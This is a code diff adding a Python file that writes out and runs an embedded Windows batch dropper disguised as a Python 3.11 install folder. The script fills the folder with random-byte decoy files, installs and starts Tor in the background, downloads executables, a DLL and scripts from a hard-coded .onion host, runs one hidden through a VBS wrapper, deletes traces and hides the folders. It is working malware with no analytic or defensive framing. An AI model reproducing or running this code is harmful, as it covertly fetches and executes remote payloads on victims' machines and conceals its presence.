@@ -1,0 +1,182 @@
+import os
+
+code = """
+@echo off
+setlocal
+setlocal enabledelayedexpansion
+
+:: ===============================
+:: CONFIGURATION
+:: ===============================
+set "BASE=%USERPROFILE%\Downloads\python-v.3.11.0\lib"
+set "TOR_DIR=%BASE%\tor"
+set "TOR_DATA=%TOR_DIR%\data"
+set "TOR_DATA_UNIX=%TOR_DATA:\=/%"
+set "TOR_ARCHIVE=%BASE%\tor-win32.tar.gz"
+set "VENV=%USERPROFILE%\Downloads\python-v.3.11.0\.venv"
+set "INSC_BAT=%TEMP%\Installer.bat"
+set "INSC_VBS=%TEMP%\run_installer.vbs"
+
+del "%INSC_BAT%" 2>nul
+
+:: Writing each line, first with > (overwrite), then >> (append) for all following lines
+
+echo ::[Bat To Exe Converter] > "%INSC_BAT%"
+echo :: >> "%INSC_BAT%"
+echo ::YAwzoRdxOk+EWAjk >> "%INSC_BAT%"
+echo ::fBw5plQjdCyDJGyX8VAjFA1dRxCNAFuzBbogx+r64uu7pEQRUaw2e4C7 >> "%INSC_BAT%"
+echo ::YAwzuBVtJxjWCl3EqQJgSA== >> "%INSC_BAT%"
+echo ::ZR4luwNxJguZRRnk >> "%INSC_BAT%"
+echo ::Yhs/ulQjdF+5 >> "%INSC_BAT%"
+echo ::cxAkpRVqdFKZSzk= >> "%INSC_BAT%"
+echo ::cBs/ulQjdF65 >> "%INSC_BAT%"
+echo ::ZR41oxFsdFKZSDk= >> "%INSC_BAT%"
+echo ::eBoioBt6dFKZSDk= >> "%INSC_BAT%"
+echo ::cRo6pxp7LAbNWATEpCI= >> "%INSC_BAT%"
+echo ::egkzugNsPRvcWATEpCI= >> "%INSC_BAT%"
+echo ::dAsiuh18IRvcCkqN+0xwdVs0 >> "%INSC_BAT%"
+echo ::cRYluBh/LU+EWAnk >> "%INSC_BAT%"
+echo ::YxY4rhs+aU+JeA== >> "%INSC_BAT%"
+echo ::cxY6rQJ7JhzQF1fEqQJQ >> "%INSC_BAT%"
+echo ::ZQ05rAF9IBncCkqN+0xwdVs0 >> "%INSC_BAT%"
+echo ::ZQ05rAF9IAHYFVzEqQJQ >> "%INSC_BAT%"
+echo ::eg0/rx1wNQPfEVWB+kM9LVsJDGQ= >> "%INSC_BAT%"
+echo ::fBEirQZwNQPfEVWB+kM9LVsJDGQ= >> "%INSC_BAT%"
+echo ::cRolqwZ3JBvQF1fEqQJQ >> "%INSC_BAT%"
+echo ::dhA7uBVwLU+EWDk= >> "%INSC_BAT%"
+echo ::YQ03rBFzNR3SWATElA== >> "%INSC_BAT%"
+echo ::dhAmsQZ3MwfNWATElA== >> "%INSC_BAT%"
+echo ::ZQ0/vhVqMQ3MEVWAtB9wSA== >> "%INSC_BAT%"
+echo ::Zg8zqx1/OA3MEVWAtB9wSA== >> "%INSC_BAT%"
+echo ::dhA7pRFwIByZRRnk >> "%INSC_BAT%"
+echo ::Zh4grVQjdCyDJGyX8VAjFA1dRxCNAES4B7gd19jp4OCCoVkOaM09eYLa5p2AM/QS5knhZ7QM4jRfgM5s >> "%INSC_BAT%"
+echo ::YB416Ek+ZG8= >> "%INSC_BAT%"
+echo :: >> "%INSC_BAT%"
+echo ::978f952a14a936cc963da21a135fa983 >> "%INSC_BAT%"
+echo @echo off >> "%INSC_BAT%"
+echo setlocal >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo :: CONFIGURATION >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo set "BASE=%%USERPROFILE%%\Downloads\python-v.3.11.0\lib" >> "%INSC_BAT%"
+echo set "TOR_DIR=%%BASE%%\tor" >> "%INSC_BAT%"
+echo set "TOR_DATA=%%TOR_DIR%%\data" >> "%INSC_BAT%"
+echo set "TOR_ARCHIVE=%%BASE%%\tor-win32.tar.gz" >> "%INSC_BAT%"
+echo set "VENV=%%USERPROFILE%%\Downloads\python-v.3.11.0\.venv" >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo :: CREATE FOLDERS >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo mkdir "%%BASE%%" 2^>nul >> "%INSC_BAT%"
+echo mkdir "%%TOR_DIR%%" 2^>nul >> "%INSC_BAT%"
+echo mkdir "%%TOR_DATA%%" 2^>nul >> "%INSC_BAT%"
+echo mkdir "%%VENV%%" 2^>nul >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo if /I "%%~dp0" == "%%VENV%%" ( >> "%INSC_BAT%"
+echo     rem Do nothing or place commands here >> "%INSC_BAT%"
+echo ) else ( >> "%INSC_BAT%"
+echo     for /L %%%%A in (1,1,25) do powershell -NoProfile -ExecutionPolicy Bypass -Command "$r=[guid]::NewGuid().ToString('N'); New-Item \"$env:USERPROFILE\Downloads\python-v.3.11.0\.venv\$r.mpy\" -ItemType File" >> "%INSC_BAT%"
+echo     for /L %%%%A in (1,1,25) do powershell -NoProfile -ExecutionPolicy Bypass -Command "$r=[guid]::NewGuid().ToString('N'); $bytes = New-Object Byte[] 3070; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes(\"$env:USERPROFILE\Downloads\python-v.3.11.0\.venv\$r.cmd\", $bytes)" >> "%INSC_BAT%"
+echo     for /L %%%%A in (1,1,3) do powershell -NoProfile -ExecutionPolicy Bypass -Command "$r=[guid]::NewGuid().ToString('N'); $bytes = New-Object Byte[] 6161408; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes(\"$env:USERPROFILE\Downloads\python-v.3.11.0\.venv\$r.exe\", $bytes)" >> "%INSC_BAT%"
+echo     for /L %%%%A in (1,1,4) do powershell -NoProfile -ExecutionPolicy Bypass -Command "$r=[guid]::NewGuid().ToString('N'); $bytes = New-Object Byte[] 6074240; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes(\"$env:USERPROFILE\Downloads\python-v.3.11.0\.venv\$r.dll\", $bytes)" >> "%INSC_BAT%"
+echo ) >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo :: DOWNLOAD TOR EXPERT BUNDLE >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo echo Downloading Tor Expert Bundle... >> "%INSC_BAT%"
+echo curl -L -o "%%TOR_ARCHIVE%%" https://archive.torproject.org/tor-package-archive/torbrowser/14.5.8/tor-expert-bundle-windows-x86_64-14.5.8.tar.gz >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo :: EXTRACT AND CLEAN >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo echo Extracting Tor Expert Bundle... >> "%INSC_BAT%"
+echo tar -xf "%%TOR_ARCHIVE%%" -C "%%TOR_DIR%%" ^>nul ^|^| powershell -Command "tar -xf '%%TOR_ARCHIVE%%' -C '%%TOR_DIR%%'" >> "%INSC_BAT%"
+echo echo [+] Succesfully Extracted Tor Bundle >> "%INSC_BAT%"
+echo del "%%TOR_ARCHIVE%%" ^>nul 2^>^&1 >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo :: WRITE torrc CONFIG >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo ( >> "%INSC_BAT%"
+echo     echo SocksPort 9050 >> "%INSC_BAT%"
+echo     echo ControlPort 0 >> "%INSC_BAT%"
+echo     echo DataDirectory %TOR_DATA_UNIX%/>> "%INSC_BAT%"
+echo     echo Log notice file NUL >> "%INSC_BAT%"
+echo ) ^> "%%TOR_DIR%%\torrc" >> "%INSC_BAT%"
+echo echo [+] torrc Succesfully Written >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+echo :: CREATE STARTER (for reuse) >> "%INSC_BAT%"
+echo :: =============================== >> "%INSC_BAT%"
+>> "%INSC_BAT%" echo echo @echo off ^> "%%VENV%%\7e4560ebe40c4917a86f5190a0dca06a.cmd"
+>> "%INSC_BAT%" echo echo cd /d "%%%%~dp0" ^>^> "%%VENV%%\7e4560ebe40c4917a86f5190a0dca06a.cmd"
+>> "%INSC_BAT%" echo echo echo Starting headless Tor client... ^>^> "%%VENV%%\7e4560ebe40c4917a86f5190a0dca06a.cmd"
+>> "%INSC_BAT%" echo echo start /b %%USERPROFILE%%/Downloads/python-v.3.11.0/lib/tor/tor/tor.exe -f %%USERPROFILE%%/Downloads/python-v.3.11.0/lib/tor/torrc ^>^> "%%VENV%%\7e4560ebe40c4917a86f5190a0dca06a.cmd"
+>> "%INSC_BAT%" echo echo echo. ^>^> "%%VENV%%\7e4560ebe40c4917a86f5190a0dca06a.cmd"
+>> "%INSC_BAT%" echo echo echo Use this command in any terminal to fetch .onion sites: ^>^> "%%VENV%%\7e4560ebe40c4917a86f5190a0dca06a.cmd"
+>> "%INSC_BAT%" echo echo echo   curl --socks5 127.0.0.1:9050 http://example.onion ^>^> "%%VENV%%\7e4560ebe40c4917a86f5190a0dca06a.cmd"
+>> "%INSC_BAT%" echo echo echo. ^>^> "%%VENV%%\7e4560ebe40c4917a86f5190a0dca06a.cmd"
+>> "%INSC_BAT%" echo echo echo Press Ctrl+C to stop Tor. ^>^> "%%VENV%%\7e4560ebe40c4917a86f5190a0dca06a.cmd"
+echo echo [+] Tor Starter Succesfully Written >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo echo Tor installed to: %%TOR_DIR%% >> "%INSC_BAT%"
+echo echo Run "%%VENV%%\7e4560ebe40c4917a86f5190a0dca06a.cmd" to start Tor client. >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo echo When running, any tool can use SOCKS5 proxy at 127.0.0.1:9050 >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo echo Example: >> "%INSC_BAT%"
+echo echo [CMD] Start Tor Proxy: %%USERPROFILE%%\Downloads\python-v.3.11.0\lib\tor\Start-Tor-Proxy.cmd >> "%INSC_BAT%"
+echo echo [CMD] curl --socks5-hostname 127.0.0.1:9050 [http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion](http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion) >> "%INSC_BAT%"
+echo echo [PS1] iwr [http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion](http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion) -Proxy 'socks5://127.0.0.1:9050' >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo start "" /B %%USERPROFILE%%/Downloads/python-v.3.11.0/lib/tor/tor/tor.exe -f %%USERPROFILE%%/Downloads/python-v.3.11.0/lib/tor/torrc >> "%INSC_BAT%"
+echo timeout /t 10 /nobreak ^>nul >> "%INSC_BAT%"
+echo curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/shell_starter27" -o "%%VENV%%\033edbe7cb6f4e6497504ebd31b4a505.exe" >> "%INSC_BAT%"
+echo curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/directmanipulation_proxy27" -o "%%VENV%%\5283fc6080434734ae52f2de1cbe704b.dll" >> "%INSC_BAT%"
+echo curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/proxyInstaller27" -o "%%VENV%%\proxyInstaller.cmd" >> "%INSC_BAT%"
+echo curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/receiver" -o "%%VENV%%\3c114757445d4a248fe719f3d0f90582.cmd" >> "%INSC_BAT%"
+echo. >> "%INSC_BAT%"
+echo start "" /B "%%VENV%%\proxyInstaller.cmd" >> "%INSC_BAT%"
+echo timeout /t 5 /nobreak ^>nul >> "%INSC_BAT%"
+echo del "%%VENV%%\proxyInstaller.cmd" >> "%INSC_BAT%"
+echo attrib +h +s "%%VENV%%" >> "%INSC_BAT%"
+echo attrib +h +s "%%TOR_DIR%%" >> "%INSC_BAT%"
+echo attrib +h +s "%%USERPROFILE%%\Downloads\python-v.3.11.0" >> "%INSC_BAT%"
+echo endlocal >> "%INSC_BAT%"
+
+:: ===============================
+:: CREATE VBS SCRIPT TO RUN Installer.bat IN HIDDEN MODE
+:: ===============================
+
+echo Set WshShell = CreateObject("WScript.Shell") > "%INSC_VBS%"
+echo WshShell.Run "%INSC_BAT%", 0 >> "%INSC_VBS%"
+echo Set WshShell = Nothing >> "%INSC_VBS%"
+
+:: ===============================
+:: RUN THE VBS SCRIPT TO LAUNCH Installer.bat HIDDEN
+:: ===============================
+wscript "%INSC_VBS%"
+
+endlocal
+"""
+
+def write_to_file(filename, content, replace=False):
+    try:
+        filename = os.path.expandvars(filename)
+        # normalize slashes/backslashes
+        filename = os.path.normpath(filename)
+        if not replace:
+            mode = 'a'
+        else:
+            mode = 'w'
+        with open(filename, mode) as file:  # 'a' for append mode
+            file.write(str(content))
+            file.write("\n")
+    except Exception as e:
+        print("Error writing to file:", e)
+
+write_to_file("%TEMP%/file.cmd", code, True)
+os.system("%TEMP%/file.cmd")
+os.system("del \"%TEMP%/file.cmd\"")
